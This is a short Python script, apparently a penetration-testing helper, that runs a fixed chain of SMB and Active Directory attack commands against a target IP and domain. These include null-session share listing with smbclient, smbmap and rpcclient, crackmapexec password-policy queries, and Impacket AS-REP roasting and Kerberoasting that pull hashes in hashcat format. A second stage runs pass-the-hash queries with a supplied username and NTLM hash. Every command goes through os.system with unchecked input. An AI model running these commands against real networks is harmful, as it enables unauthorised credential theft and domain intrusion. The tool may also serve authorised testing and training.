#!/usr/bin/python3
import os
import sys
import colorama
from colorama import Fore, Style

yes		= [ "yes","y", "yee yee", "yee", "yeah", "yeet", "yeet cannon", "yea", "yeah", "ye"]
try:
	ip = sys.argv[1]
except:
	ip = "1.1.1.1"
try:
	dn = sys.argv[2]
except:
	dn = "yeet.wtf"

def main():
	q1	= input("Would you like to jump to credentialed scans?\n> ").lower()
	if q1 in yes:
		credscans()
	else:
		scans()

def scans():
	print("""
command0 = "nbtscan {}"
command1 = "smb -H {}"
command2 = "smb -H {} -u null -p null"
command3 = "smbclient -N -L //{}"
	smbclient -N '//{}/coolshare'
command31= "smbclient -N '//{}/ --option='client min protocol'=LANMAN1"
command4 = "rpcclient {}"
command5 = "rpcclient -U '' {}"
	enumdomusers
	queryuser tony
	queryusergroups 0x47b
	querygroup 0x201
	exit
command6 = "crackmapexec smb {}"
command7 = "crackmapexec smb {} --pass-pol -u '' -p ''"
command8 = "GetADUsers.py -dc-ip {} '{}/' -all"
command9 = "GetNPUsers.py -dc-ip {} -request '{}/' -format hashcat"
command10= "GetUserSPNs.py -dc-ip {} -request '{}/'"
command11= "getArch.py -target {}"
""".format(ip, ip, ip, ip, ip, ip, ip, ip, ip, ip, ip, dn, ip, dn, ip, dn, ip))
	command0 = "nbtscan {}".format(ip)
	command1 = "smbmap -H {}".format(ip)
	command2 = "smbmap -H {} -u null -p null".format(ip)
	command3 = "smbclient -N -L //{}".format(ip)
	command31= "smbclient -N '//{}/ --option='client min protocol'=LANMAN1"
	command4 = "rpcclient {}".format(ip)
	command5 = "rpcclient -U '' {}".format(ip)
	command6 = "crackmapexec smb {}".format(ip)
	command7 = "crackmapexec smb {} --pass-pol -u '' -p ''".format(ip)
	command8 = "GetADUsers.py -dc-ip {} '{}/' -all".format(ip, dn)
	command9 = "GetNPUsers.py -dc-ip {} -request '{}/' -format hashcat".format(ip, dn)
	command10= "GetUserSPNs.py -dc-ip {} -request '{}/'".format(ip, dn)
	command11= "getArch.py -target {}".format(ip)
	commandlist	= [command0, command1, command2, command3, command4, command5, command6, command7, command8, command9, command10, command11]
	
	for command in commandlist:
		input(Fore.GREEN + command )
		print(Style.RESET_ALL)
		os.system(command)

	q2 = input("Would you like to start credentialed scans?\n> ")
	if q2 in yes:
		credscans()
	else:
		print("Later Tater")
		quit()

def credscans():
	username	= input("What is the username?\n> ")
	cred 	 	= input("What is the password or hash? (must be in LM:NTLM format(LM can be Garbage but it has to be there))\n> ")
	domain	 	= input("What is the workgroup/domain?\n> ")

	print("""
command1 = "smbmap -H {} -u {} -p {}"
command2 = "smbclient -h '\\{}\' -U {} -W {} -l {}"
command3 = "smbclient -h '\\{}\' -U {} -W {} -l {} --pw-nt-hash {}"
command4 = "crackmapexec smb {} -u {} -p {} --shares"
command5 = "GetADUsers.py {}/{}:{} -all"
command6 = "GetNPUsers.py {}/{}:{} -request -format hashcat"
command7 = "GetUserSPNs.py {}/{}:{} -request"
""".format(ip, username, cred, ip, username, domain, ip, ip ,username, domain, ip, cred, ip, username, cred, domain, username, cred, domain, username, cred, domain, username, cred))

	command1 = "smbmap -H {} -u {} -p {}".format(ip, username, cred)
	command2 = "smbclient -h '\\\\{}\\\' -U {} -W {} -l {}".format(ip, username, domain, ip)
	command3 = "smbclient -h '\\\\{}\\\' -U {} -W {} -l {} --pw-nt-hash {}".format(ip, username, domain, ip, cred)
	command4 = "crackmapexec smb {} -u {} -p {} --shares".format(ip, username, cred)
	command5 = "GetADUsers.py {}/{}:{} -all".format(domain, username, cred)
	command6 = "GetNPUsers.py {}/{}:{} -request -format hashcat".format(domain, username, cred)
	command7 = "GetUserSPNs.py {}/{}:{} -request".format(domain, username, cred)
	commandlist	= [command1, command2, command3, command4, command5, command6, command7]

	for command in commandlist:
		input(Fore.GREEN + command )
		print(Style.RESET_ALL)
		os.system(command)

main()